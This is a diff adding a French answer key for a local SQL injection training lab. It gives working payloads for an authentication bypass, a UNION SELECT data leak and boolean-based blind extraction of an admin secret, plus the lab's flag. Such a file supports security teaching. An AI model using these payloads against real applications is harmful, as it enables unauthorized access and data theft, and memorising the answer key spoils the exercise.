@@ -1,0 +1,88 @@
+SOLUTIONS DE TEST - SQLI AUTH LAB
+=================================
+
+Ce fichier sert uniquement à valider le fonctionnement du lab en local.
+
+1) NIVEAU FACILE
+----------------
+URL : http://localhost:8080/?level=easy
+
+Objectif : bypass du login admin.
+
+Exemple de payload :
+- Username : admin' --
+- Password : test
+
+Effet attendu :
+- La requête devient de type :
+  SELECT ... FROM users WHERE username = 'admin' -- ' AND password = 'test'
+- Le login passe en tant qu'admin.
+
+Alternative :
+- Username : ' OR 1=1 --
+- Password : test
+
+
+2) NIVEAU MOYEN
+---------------
+URL : http://localhost:8080/?level=medium
+
+Objectif : utiliser UNION SELECT pour lire une autre table.
+
+Payload principal :
+- Champ “Rôle / département” :
+  ' UNION SELECT id, owner, title, secret FROM secret_notes --
+
+Effet attendu :
+- Le tableau affiche les lignes de la table secret_notes.
+- Une des valeurs attendues est : FLAG{union_leaks_data}
+
+Astuce de validation :
+- La vue attend 4 colonnes, donc le UNION doit retourner 4 colonnes.
+
+Test d'erreur utile :
+- Entrer simplement : '
+- Cela doit déclencher une erreur SQL visible.
+
+
+3) NIVEAU DIFFICILE
+-------------------
+URL : http://localhost:8080/?level=hard
+
+Objectif : confirmer des conditions booléennes sans affichage direct du secret.
+
+Payload de bypass simple :
+- Jeton admin : ' OR 1=1 --
+
+Effet attendu :
+- La page répond “Jeton valide”.
+
+Payload booléen pour tester le 1er caractère du secret admin :
+- Jeton admin :
+  x' OR substr((SELECT secret FROM secret_notes WHERE owner='admin' LIMIT 1),1,1)='F' --
+
+Résultat attendu :
+- Réponse “Jeton valide” car le secret commence par F.
+
+Payload négatif :
+- Jeton admin :
+  x' OR substr((SELECT secret FROM secret_notes WHERE owner='admin' LIMIT 1),1,1)='Z' --
+
+Résultat attendu :
+- Réponse “Jeton invalide”.
+
+Exemple pour le 2e caractère :
+- Jeton admin :
+  x' OR substr((SELECT secret FROM secret_notes WHERE owner='admin' LIMIT 1),2,1)='L' --
+
+Résultat attendu :
+- Réponse “Jeton valide”.
+
+Secret inséré dans la base pour admin :
+- FLAG{union_leaks_data}
+
+
+ENDPOINTS UTILES
+----------------
+- Reset : http://localhost:8080/reset.php
+- Health : http://localhost:8080/health.php
